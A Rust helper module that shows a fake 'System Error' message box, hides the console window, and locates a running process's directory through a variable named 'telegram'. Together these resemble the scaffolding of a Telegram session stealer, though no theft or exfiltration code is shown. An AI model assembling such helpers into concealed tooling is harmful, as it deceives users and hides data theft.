use std::env;
#[cfg(target_os = "windows")]
use std::{ffi::CString, ptr};
use sysinfo::{ProcessExt, ProcessRefreshKind, SystemExt};

#[cfg(target_os = "windows")]
use user32::MessageBoxA;

#[cfg(target_os = "windows")]
use winapi::um::{
    wincon::GetConsoleWindow,
    winuser::{ShowWindow, MB_ICONERROR, MB_OK, SW_HIDE},
};

#[cfg(target_os = "windows")]
pub fn show_error(message: &str) {
    let caption = CString::new("System Error").unwrap();
    let text = CString::new(message).unwrap();
    unsafe {
        MessageBoxA(
            ptr::null_mut(),
            text.as_ptr(),
            caption.as_ptr(),
            MB_OK | MB_ICONERROR,
        );
    }
}

#[cfg(target_os = "windows")]
pub fn hide_console() {
    unsafe {
        let window = GetConsoleWindow();
        if window.is_null() {
            return;
        }
        ShowWindow(window, SW_HIDE);
    }
}

pub fn get_directory_by_process(process_name: &str) -> Option<String> {
    let mut system = sysinfo::System::new();
    let filter = ProcessRefreshKind::new();
    system.refresh_processes_specifics(filter.without_cpu().without_disk_usage());
    let telegram = system.processes_by_name(process_name).next()?;
    Some(telegram.root().display().to_string())
}

pub fn get_temp_dir_path() -> Result<String, String> {
    let path = env::temp_dir().display().to_string();
    if path.is_empty() {
        return Err("Error get temp dir!".to_string());
    }
    Ok(path)
}

pub fn generate_uuid() -> String {
    uuid::Uuid::new_v4().to_string()
}

mod host {}
